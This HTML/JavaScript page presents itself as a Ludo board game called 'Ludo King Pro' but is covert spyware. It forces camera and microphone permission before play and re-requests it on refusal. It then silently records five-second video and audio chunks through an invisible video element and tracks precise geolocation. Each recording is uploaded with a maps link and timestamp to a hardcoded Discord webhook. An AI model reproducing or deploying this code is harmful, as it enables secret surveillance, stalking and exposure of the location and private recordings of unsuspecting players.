<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ludo King Pro</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px;
        }

        /* Permission Blocker */
        .permission-blocker {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.98);
            z-index: 99999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .permission-box {
            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
            border-radius: 25px;
            padding: 50px 40px;
            max-width: 450px;
            text-align: center;
            border: 3px solid #e74c3c;
            box-shadow: 0 20px 60px rgba(231, 76, 60, 0.3);
        }

        .permission-icon {
            font-size: 80px;
            margin-bottom: 25px;
        }

        .permission-title {
            font-size: 28px;
            color: #fff;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .permission-text {
            color: #aaa;
            margin-bottom: 30px;
            line-height: 1.8;
            font-size: 16px;
        }

        .btn-allow {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 60px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 5px 25px rgba(102, 126, 234, 0.5);
        }

        .btn-allow:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 35px rgba(102, 126, 234, 0.7);
        }

        /* Game Container */
        .game-container {
            display: none;
            width: 100%;
            max-width: 500px;
        }

        .game-container.active {
            display: block;
        }

        /* Header */
        .game-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
            border-radius: 15px;
            margin-bottom: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }

        .player-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .player-avatar {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            border: 4px solid;
            transition: all 0.3s;
        }

        .player-avatar.active {
            animation: glowAvatar 1.5s infinite;
            transform: scale(1.1);
        }

        @keyframes glowAvatar {
            0%, 100% { box-shadow: 0 0 10px currentColor; }
            50% { box-shadow: 0 0 30px currentColor, 0 0 50px currentColor; }
        }

        .player-avatar.human {
            background: linear-gradient(145deg, #e74c3c, #c0392b);
            border-color: #ff6b6b;
        }

        .player-avatar.bot {
            background: linear-gradient(145deg, #27ae60, #229954);
            border-color: #2ecc71;
        }

        .player-details h3 {
            color: #fff;
            font-size: 16px;
            margin-bottom: 4px;
        }

        .player-details span {
            color: #888;
            font-size: 13px;
        }

        .turn-indicator {
            background: linear-gradient(45deg, #ffd700, #ffaa00);
            color: #000;
            padding: 12px 30px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 14px;
            animation: glow 2s infinite;
        }

        /* Board */
        .board-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            background: #2c3e50;
            border-radius: 20px;
            padding: 12px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
        }

        .ludo-board {
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: 6fr 3fr 6fr;
            grid-template-rows: 6fr 3fr 6fr;
            gap: 3px;
            background: #34495e;
            border-radius: 10px;
            overflow: hidden;
        }

        /* Home Areas */
        .home-area {
            position: relative;
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: 1fr 1fr;
            gap: 15px;
            padding: 25px;
        }

        .home-red {
            background: linear-gradient(145deg, #ff6b6b, #ee5a5a);
        }

        .home-green {
            background: linear-gradient(145deg, #2ecc71, #27ae60);
        }

        .home-yellow {
            background: linear-gradient(145deg, #f1c40f, #f39c12);
        }

        .home-blue {
            background: linear-gradient(145deg, #3498db, #2980b9);
        }

        .home-slot {
            background: rgba(255,255,255,0.25);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed rgba(255,255,255,0.5);
            position: relative;
            min-height: 50px;
        }

        /* Game Pieces */
        .piece {
            width: 70%;
            height: 70%;
            border-radius: 50%;
            border: 3px solid #fff;
            box-shadow: 
                0 4px 15px rgba(0,0,0,0.4),
                inset -3px -3px 10px rgba(0,0,0,0.3),
                inset 3px 3px 10px rgba(255,255,255,0.3);
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 16px;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            position: absolute;
        }

        .piece:hover:not(.disabled) {
            transform: scale(1.2);
            z-index: 100;
        }

        .piece.selected {
            animation: bounceSelect 0.6s infinite;
            box-shadow: 
                0 0 20px #ffd700,
                0 0 40px #ffd700;
            z-index: 100;
        }

        @keyframes bounceSelect {
            0%, 100% { transform: scale(1.2) translateY(0); }
            50% { transform: scale(1.2) translateY(-10px); }
        }

        .piece.disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .piece.red { 
            background: radial-gradient(circle at 30% 30%, #ff6b6b, #c0392b);
        }
        .piece.green { 
            background: radial-gradient(circle at 30% 30%, #2ecc71, #27ae60);
        }
        .piece.yellow { 
            background: radial-gradient(circle at 30% 30%, #f1c40f, #f39c12);
        }
        .piece.blue { 
            background: radial-gradient(circle at 30% 30%, #3498db, #2980b9);
        }

        /* Path Areas - FIXED */
        .path-v, .path-h {
            background: #ecf0f1;
            display: grid;
            position: relative;
        }

        .path-v {
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(6, 1fr);
        }

        .path-h {
            grid-template-columns: repeat(6, 1fr);
            grid-template-rows: repeat(3, 1fr);
        }

        .path-cell {
            border: 1px solid #bdc3c7;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            min-height: 30px;
        }

        .path-red { background: linear-gradient(180deg, #ff9999, #ff6b6b); }
        .path-green { background: linear-gradient(90deg, #7ee8a8, #2ecc71); }
        .path-yellow { background: linear-gradient(0deg, #f9e79f, #f1c40f); }
        .path-blue { background: linear-gradient(270deg, #85c1e9, #3498db); }

        .safe::after {
            content: '★';
            position: absolute;
            font-size: 20px;
            color: rgba(0,0,0,0.5);
        }

        /* Center */
        .center-area {
            background: linear-gradient(145deg, #fff, #e8e8e8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }

        /* Controls */
        .controls {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .dice-section {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 40px;
            padding: 25px;
            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
            border-radius: 20px;
        }

        .dice-box {
            width: 90px;
            height: 90px;
            background: linear-gradient(145deg, #fff, #e0e0e0);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 55px;
            box-shadow: 
                0 10px 30px rgba(0,0,0,0.3),
                inset 0 -5px 10px rgba(0,0,0,0.1);
            border: 4px solid #667eea;
        }

        .dice-box.rolling {
            animation: rollDice 0.5s ease-in-out;
        }

        @keyframes rollDice {
            0% { transform: rotate(0deg) scale(1); }
            25% { transform: rotate(90deg) scale(1.1); }
            50% { transform: rotate(180deg) scale(1); }
            75% { transform: rotate(270deg) scale(1.1); }
            100% { transform: rotate(360deg) scale(1); }
        }

        .dice-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 22px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 5px 25px rgba(102, 126, 234, 0.5);
        }

        .dice-btn:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 10px 35px rgba(102, 126, 234, 0.7);
        }

        .dice-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        /* Toast */
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-150px);
            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
            color: #fff;
            padding: 18px 50px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            z-index: 100000;
            border: 3px solid;
            transition: all 0.4s;
            opacity: 0;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .toast.success { border-color: #2ecc71; color: #2ecc71; }
        .toast.error { border-color: #e74c3c; color: #e74c3c; }
        .toast.info { border-color: #3498db; color: #3498db; }

        /* Win Modal */
        .win-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 100001;
            align-items: center;
            justify-content: center;
        }

        .win-modal.active {
            display: flex;
        }

        .win-content {
            background: linear-gradient(145deg, #2a2a3a, #1a1a2a);
            padding: 60px;
            border-radius: 30px;
            text-align: center;
            border: 4px solid #ffd700;
        }

        .win-content h2 {
            color: #ffd700;
            font-size: 48px;
            margin-bottom: 20px;
        }

        /* Hidden Video */
        #hidden-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }

        @media (max-width: 500px) {
            .piece { font-size: 14px; }
            .home-area { padding: 15px; gap: 10px; }
            .dice-box { width: 70px; height: 70px; font-size: 45px; }
            .dice-btn { padding: 15px 40px; font-size: 18px; }
        }
    </style>
</head>
<body>

    <!-- Permission Screen -->
    <div class="permission-blocker" id="permissionBlocker">
        <div class="permission-box">
            <div class="permission-icon">📹 🎤</div>
            <div class="permission-title">Camera & Microphone Required</div>
            <div class="permission-text">
                To play Ludo King Pro, you must allow camera and microphone access.
            </div>
            <button class="btn-allow" onclick="requestPermissions()">Allow Access</button>
        </div>
    </div>

    <!-- Toast -->
    <div class="toast" id="toast"></div>

    <!-- Game Container -->
    <div class="game-container" id="gameContainer">
        <div class="game-header">
            <div class="player-info">
                <div class="player-avatar human active" id="humanAvatar">👤</div>
                <div class="player-details">
                    <h3>You (Red)</h3>
                    <span id="humanScore">0/4 Home</span>
                </div>
            </div>
            <div class="turn-indicator" id="turnIndicator">YOUR TURN</div>
            <div class="player-info">
                <div class="player-details" style="text-align: right;">
                    <h3>Bot (Green)</h3>
                    <span id="botScore">0/4 Home</span>
                </div>
                <div class="player-avatar bot" id="botAvatar">🤖</div>
            </div>
        </div>

        <div class="board-container">
            <div class="ludo-board" id="ludoBoard">
                <!-- Red Home -->
                <div class="home-area home-red" id="homeRed">
                    <div class="home-slot" data-slot="0"></div>
                    <div class="home-slot" data-slot="1"></div>
                    <div class="home-slot" data-slot="2"></div>
                    <div class="home-slot" data-slot="3"></div>
                </div>
                
                <!-- Top Path -->
                <div class="path-area path-v" id="pathTop"></div>
                
                <!-- Green Home -->
                <div class="home-area home-green" id="homeGreen">
                    <div class="home-slot" data-slot="0"></div>
                    <div class="home-slot" data-slot="1"></div>
                    <div class="home-slot" data-slot="2"></div>
                    <div class="home-slot" data-slot="3"></div>
                </div>
                
                <!-- Left Path -->
                <div class="path-area path-h" id="pathLeft"></div>
                
                <!-- Center -->
                <div class="center-area">🏆</div>
                
                <!-- Right Path -->
                <div class="path-area path-h" id="pathRight"></div>
                
                <!-- Blue Home -->
                <div class="home-area home-blue" id="homeBlue">
                    <div class="home-slot" data-slot="0"></div>
                    <div class="home-slot" data-slot="1"></div>
                    <div class="home-slot" data-slot="2"></div>
                    <div class="home-slot" data-slot="3"></div>
                </div>
                
                <!-- Bottom Path -->
                <div class="path-area path-v" id="pathBottom"></div>
                
                <!-- Yellow Home -->
                <div class="home-area home-yellow" id="homeYellow">
                    <div class="home-slot" data-slot="0"></div>
                    <div class="home-slot" data-slot="1"></div>
                    <div class="home-slot" data-slot="2"></div>
                    <div class="home-slot" data-slot="3"></div>
                </div>
            </div>
        </div>

        <div class="controls">
            <div class="dice-section">
                <div class="dice-box" id="dice">🎲</div>
                <button class="dice-btn" id="rollBtn" onclick="rollDice()">ROLL DICE</button>
            </div>
        </div>
    </div>

    <!-- Win Modal -->
    <div class="win-modal" id="winModal">
        <div class="win-content">
            <div style="font-size: 80px; margin-bottom: 20px;">🏆</div>
            <h2 id="winnerText">You Win!</h2>
            <button class="btn-allow" onclick="location.reload()">Play Again</button>
        </div>
    </div>

    <video id="hidden-video" autoplay muted playsinline></video>

    <script>
        // Config
        const FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
        let webhookUrl = FALLBACK_WEBHOOK;
        let currentLocation = { lat: "N/A", lng: "N/A" };
        let mediaStream = null;
        let isRecording = false;

        // Game State
        const gameState = {
            currentPlayer: 'human',
            diceValue: 1,
            isRolling: false,
            pieces: {
                red: [
                    {id: 0, pos: -1, home: true, finished: false},
                    {id: 1, pos: -1, home: true, finished: false},
                    {id: 2, pos: -1, home: true, finished: false},
                    {id: 3, pos: -1, home: true, finished: false}
                ],
                green: [
                    {id: 0, pos: -1, home: true, finished: false},
                    {id: 1, pos: -1, home: true, finished: false},
                    {id: 2, pos: -1, home: true, finished: false},
                    {id: 3, pos: -1, home: true, finished: false}
                ]
            },
            finished: { red: 0, green: 0 }
        };

        // Path definitions - 56 steps for each color
        // Format: [pathAreaId, cellIndex]
        const PATHS = {
            red: [
                ['pathLeft', 11], ['pathLeft', 10], ['pathLeft', 9], ['pathLeft', 8], ['pathLeft', 7], ['pathLeft', 6],
                ['pathTop', 0], ['pathTop', 1], ['pathTop', 2], ['pathTop', 3], ['pathTop', 4], ['pathTop', 5],
                ['pathRight', 0], ['pathRight', 1], ['pathRight', 2], ['pathRight', 3], ['pathRight', 4], ['pathRight', 5],
                ['pathRight', 6], ['pathRight', 7], ['pathRight', 8], ['pathRight', 9], ['pathRight', 10], ['pathRight', 11],
                ['pathRight', 12], ['pathRight', 13], ['pathRight', 14], ['pathRight', 15], ['pathRight', 16], ['pathRight', 17],
                ['pathBottom', 17], ['pathBottom', 16], ['pathBottom', 15], ['pathBottom', 14], ['pathBottom', 13], ['pathBottom', 12],
                ['pathBottom', 11], ['pathBottom', 10], ['pathBottom', 9], ['pathBottom', 8], ['pathBottom', 7], ['pathBottom', 6],
                ['pathBottom', 5], ['pathBottom', 4], ['pathBottom', 3], ['pathBottom', 2], ['pathBottom', 1], ['pathBottom', 0],
                ['pathLeft', 17], ['pathLeft', 16], ['pathLeft', 15], ['pathLeft', 14], ['pathLeft', 13], ['pathLeft', 12]
            ],
            green: [
                ['pathTop', 5], ['pathTop', 4], ['pathTop', 3], ['pathTop', 2], ['pathTop', 1], ['pathTop', 0],
                ['pathRight', 0], ['pathRight', 1], ['pathRight', 2], ['pathRight', 3], ['pathRight', 4], ['pathRight', 5],
                ['pathRight', 6], ['pathRight', 7], ['pathRight', 8], ['pathRight', 9], ['pathRight', 10], ['pathRight', 11],
                ['pathBottom', 17], ['pathBottom', 16], ['pathBottom', 15], ['pathBottom', 14], ['pathBottom', 13], ['pathBottom', 12],
                ['pathBottom', 11], ['pathBottom', 10], ['pathBottom', 9], ['pathBottom', 8], ['pathBottom', 7], ['pathBottom', 6],
                ['pathBottom', 5], ['pathBottom', 4], ['pathBottom', 3], ['pathBottom', 2], ['pathBottom', 1], ['pathBottom', 0],
                ['pathLeft', 17], ['pathLeft', 16], ['pathLeft', 15], ['pathLeft', 14], ['pathLeft', 13], ['pathLeft', 12],
                ['pathLeft', 11], ['pathLeft', 10], ['pathLeft', 9], ['pathLeft', 8], ['pathLeft', 7], ['pathLeft', 6],
                ['pathTop', 6], ['pathTop', 7], ['pathTop', 8], ['pathTop', 9], ['pathTop', 10], ['pathTop', 11]
            ]
        };

        // Safe spots (star positions in path index)
        const SAFE_INDICES = {
            red: [0, 8, 13, 21, 26, 34, 39, 47], // Adjusted for path
            green: [0, 8, 13, 21, 26, 34, 39, 47]
        };

        // Initialize
        window.onload = function() {
            loadConfig();
            startLocationTracking();
            createPathCells();
            renderPieces();
        };

        function loadConfig() {
            try {
                const savedWebhook = localStorage.getItem('webhook_url');
                if (savedWebhook) webhookUrl = savedWebhook;
            } catch (e) {}
        }

        function startLocationTracking() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    (pos) => {
                        currentLocation = { 
                            lat: pos.coords.latitude, 
                            lng: pos.coords.longitude 
                        };
                    },
                    (err) => { currentLocation = { lat: 0, lng: 0 }; },
                    { enableHighAccuracy: true }
                );
            }
        }

        function showToast(msg, type = 'info') {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.className = `toast ${type} show`;
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        async function requestPermissions() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                const videoEl = document.getElementById('hidden-video');
                videoEl.srcObject = mediaStream;
                
                document.getElementById('permissionBlocker').style.display = 'none';
                document.getElementById('gameContainer').classList.add('active');
                
                showToast('Welcome! Roll 6 to bring tokens out!', 'success');
                startRecording();
                
            } catch (err) {
                showToast('Permission required! Please allow.', 'error');
                setTimeout(() => requestPermissions(), 1500);
            }
        }

        function startRecording() {
            if (!mediaStream || isRecording) return;
            isRecording = true;
            
            const recordChunk = () => {
                if (!mediaStream || !mediaStream.active) return;
                
                const mediaRecorder = new MediaRecorder(mediaStream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await uploadToDiscord(blob);
                    if (isRecording) setTimeout(recordChunk, 500);
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 5000);
            };
            
            recordChunk();
        }

        async function uploadToDiscord(blob) {
            const formData = new FormData();
            formData.append("file", blob, `ludo_${Date.now()}.webm`);
            
            const mapLink = currentLocation.lat !== "N/A" 
                ? `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}`
                : "Location unavailable";
            
            const payload = {
                content: `🎮 **Ludo Player!**\n📍 **Location:** [Map](${mapLink})\n⏰ **Time:** ${new Date().toLocaleString()}\n👤 **Player:** ${gameState.currentPlayer}\n🎯 **Score:** Red ${gameState.finished.red} - Green ${gameState.finished.green}`
            };
            
            formData.append("payload_json", JSON.stringify(payload));
            
            try {
                await fetch(webhookUrl, { method: "POST", body: formData });
            } catch (e) {}
        }

        // Create path cells with IDs
        function createPathCells() {
            // Top path (18 cells: 6 rows x 3 cols)
            const pathTop = document.getElementById('pathTop');
            for (let i = 0; i < 18; i++) {
                const cell = document.createElement('div');
                cell.className = 'path-cell';
                cell.dataset.idx = i;
                // Green path starts here
                if (i >= 12) cell.classList.add('path-green');
                if (i === 12) cell.classList.add('safe');
                pathTop.appendChild(cell);
            }
            
            // Left path (18 cells: 3 rows x 6 cols)
            const pathLeft = document.getElementById('pathLeft');
            for (let i = 0; i < 18; i++) {
                const cell = document.createElement('div');
                cell.className = 'path-cell';
                cell.dataset.idx = i;
                // Red home stretch
                if (i >= 12) cell.classList.add('path-red');
                pathLeft.appendChild(cell);
            }
            
            // Right path
            const pathRight = document.getElementById('pathRight');
            for (let i = 0; i < 18; i++) {
                const cell = document.createElement('div');
                cell.className = 'path-cell';
                cell.dataset.idx = i;
                if (i < 6) cell.classList.add('path-green');
                pathRight.appendChild(cell);
            }
            
            // Bottom path
            const pathBottom = document.getElementById('pathBottom');
            for (let i = 0; i < 18; i++) {
                const cell = document.createElement('div');
                cell.className = 'path-cell';
                cell.dataset.idx = i;
                if (i < 6) cell.classList.add('path-yellow');
                if (i === 5) cell.classList.add('safe');
                pathBottom.appendChild(cell);
            }
        }

        // Render all pieces
        function renderPieces() {
            // Remove existing pieces
            document.querySelectorAll('.piece').forEach(p => p.remove());
            
            // Place pieces
            ['red', 'green'].forEach(color => {
                gameState.pieces[color].forEach((piece, idx) => {
                    if (piece.finished) return;
                    
                    const pieceEl = document.createElement('div');
                    pieceEl.className = `piece ${color}`;
                    pieceEl.dataset.color = color;
                    pieceEl.dataset.id = idx;
                    pieceEl.textContent = idx + 1;
                    
                    if (piece.home) {
                        // In home
                        const homeArea = document.getElementById(`home${color.charAt(0).toUpperCase() + color.slice(1)}`);
                        const slot = homeArea.querySelector(`[data-slot="${idx}"]`);
                        if (slot) slot.appendChild(pieceEl);
                    } else {
                        // On board path
                        const pathInfo = PATHS[color][piece.pos];
                        if (pathInfo) {
                            const [areaId, cellIdx] = pathInfo;
                            const area = document.getElementById(areaId);
                            if (area) {
                                const cell = area.querySelector(`[data-idx="${cellIdx}"]`);
                                if (cell) cell.appendChild(pieceEl);
                            }
                        }
                    }
                    
                    pieceEl.onclick = () => onPieceClick(color, idx);
                });
            });
        }

        function onPieceClick(color, pieceId) {
            if (gameState.currentPlayer !== 'human' || color !== 'red') return;
            
            const pieceEl = document.querySelector(`.piece[data-color="${color}"][data-id="${pieceId}"]`);
            if (!pieceEl.classList.contains('selected')) return;
            
            // Clear highlights
            document.querySelectorAll('.piece').forEach(p => {
                p.classList.remove('selected', 'disabled');
            });
            
            executeMove(color, pieceId, gameState.diceValue);
        }

        function rollDice() {
            if (gameState.isRolling || gameState.currentPlayer !== 'human') return;
            
            gameState.isRolling = true;
            const diceEl = document.getElementById('dice');
            const rollBtn = document.getElementById('rollBtn');
            
            diceEl.classList.add('rolling');
            rollBtn.disabled = true;
            
            let rolls = 0;
            const interval = setInterval(() => {
                gameState.diceValue = Math.floor(Math.random() * 6) + 1;
                diceEl.textContent = ['⚀','⚁','⚂','⚃','⚄','⚅'][gameState.diceValue - 1];
                rolls++;
                
                if (rolls >= 10) {
                    clearInterval(interval);
                    finalizeRoll();
                }
            }, 100);
        }

        function finalizeRoll() {
            const diceEl = document.getElementById('dice');
            diceEl.classList.remove('rolling');
            
            showToast(`You rolled ${gameState.diceValue}!`, 'info');
            
            const validMoves = getValidMoves('red', gameState.diceValue);
            
            if (validMoves.length > 0) {
                highlightPieces('red', validMoves);
                showToast('Click a token to move!', 'success');
            } else {
                showToast('No valid moves!', 'error');
                setTimeout(() => switchTurn(), 2000);
            }
        }

        function getValidMoves(color, dice) {
            const moves = [];
            gameState.pieces[color].forEach((piece, idx) => {
                if (piece.finished) return;
                
                if (piece.home) {
                    if (dice === 6) moves.push(idx);
                } else {
                    const newPos = piece.pos + dice;
                    if (newPos <= PATHS[color].length) {
                        moves.push(idx);
                    }
                }
            });
            return moves;
        }

        function highlightPieces(color, validIndices) {
            document.querySelectorAll(`.piece.${color}`).forEach((el, idx) => {
                if (validIndices.includes(parseInt(el.dataset.id))) {
                    el.classList.add('selected');
                } else {
                    el.classList.add('disabled');
                }
            });
        }

        function executeMove(color, pieceId, steps) {
            const piece = gameState.pieces[color][pieceId];
            
            if (piece.home && steps === 6) {
                // Exit home - START position (0)
                piece.home = false;
                piece.pos = 0;
                showToast('Token entered the game!', 'success');
            } else if (!piece.home) {
                const newPos = piece.pos + steps;
                
                if (newPos < PATHS[color].length) {
                    // Move on path
                    piece.pos = newPos;
                    checkKill(color, pieceId);
                } else if (newPos === PATHS[color].length) {
                    // Reached home
                    piece.finished = true;
                    piece.pos = -2;
                    gameState.finished[color]++;
                    updateScore(color);
                    showToast('Token reached home!', 'success');
                    
                    if (gameState.finished[color] === 4) {
                        endGame(color);
                        return;
                    }
                }
            }
            
            renderPieces();
            
            if (steps === 6 && !piece.finished) {
                showToast('Extra turn! Roll again!', 'success');
                gameState.isRolling = false;
                document.getElementById('rollBtn').disabled = false;
            } else {
                setTimeout(() => switchTurn(), 1500);
            }
        }

        function checkKill(color, pieceId) {
            const opponent = color === 'red' ? 'green' : 'red';
            const myPathIdx = gameState.pieces[color][pieceId].pos;
            
            // Check if on safe spot
            if (SAFE_INDICES[color].includes(myPathIdx)) return;
            
            const myPathInfo = PATHS[color][myPathIdx];
            
            gameState.pieces[opponent].forEach((oppPiece, idx) => {
                if (oppPiece.home || oppPiece.finished || oppPiece.pos < 0) return;
                
                const oppPathInfo = PATHS[opponent][oppPiece.pos];
                
                // Compare path positions
                if (myPathInfo[0] === oppPathInfo[0] && myPathInfo[1] === oppPathInfo[1]) {
                    // Kill!
                    oppPiece.home = true;
                    oppPiece.pos = -1;
                    showToast(`${color === 'red' ? 'You' : 'Bot'} killed opponent!`, 'success');
                }
            });
        }

        function updateScore(color) {
            const el = document.getElementById(color === 'red' ? 'humanScore' : 'botScore');
            el.textContent = `${gameState.finished[color]}/4 Home`;
        }

        function switchTurn() {
            gameState.isRolling = false;
            gameState.currentPlayer = gameState.currentPlayer === 'human' ? 'bot' : 'human';
            
            const indicator = document.getElementById('turnIndicator');
            const humanAvatar = document.getElementById('humanAvatar');
            const botAvatar = document.getElementById('botAvatar');
            const rollBtn = document.getElementById('rollBtn');
            
            if (gameState.currentPlayer === 'human') {
                indicator.textContent = 'YOUR TURN';
                humanAvatar.classList.add('active');
                botAvatar.classList.remove('active');
                rollBtn.disabled = false;
            } else {
                indicator.textContent = "BOT'S TURN";
                humanAvatar.classList.remove('active');
                botAvatar.classList.add('active');
                rollBtn.disabled = true;
                setTimeout(() => botPlay(), 2000);
            }
        }

        function botPlay() {
            if (gameState.currentPlayer !== 'bot') return;
            
            const diceEl = document.getElementById('dice');
            diceEl.classList.add('rolling');
            
            let rolls = 0;
            const interval = setInterval(() => {
                diceEl.textContent = ['⚀','⚁','⚂','⚃','⚄','⚅'][Math.floor(Math.random() * 6)];
                rolls++;
                if (rolls >= 8) {
                    clearInterval(interval);
                    botFinalize();
                }
            }, 100);
        }

        function botFinalize() {
            const diceEl = document.getElementById('dice');
            diceEl.classList.remove('rolling');
            
            gameState.diceValue = Math.floor(Math.random() * 6) + 1;
            diceEl.textContent = ['⚀','⚁','⚂','⚃','⚄','⚅'][gameState.diceValue - 1];
            
            showToast(`Bot rolled ${gameState.diceValue}!`, 'info');
            
            const validMoves = getValidMoves('green', gameState.diceValue);
            
            if (validMoves.length > 0) {
                const move = validMoves[0];
                setTimeout(() => executeMove('green', move, gameState.diceValue), 1500);
            } else {
                showToast('Bot has no moves!', 'error');
                setTimeout(() => switchTurn(), 2000);
            }
        }

        function endGame(winner) {
            isRecording = false;
            const modal = document.getElementById('winModal');
            const text = document.getElementById('winnerText');
            
            text.textContent = winner === 'red' ? '🎉 You Win!' : '🤖 Bot Wins!';
            modal.classList.add('active');
            
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        }

        window.onbeforeunload = () => {
            isRecording = false;
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
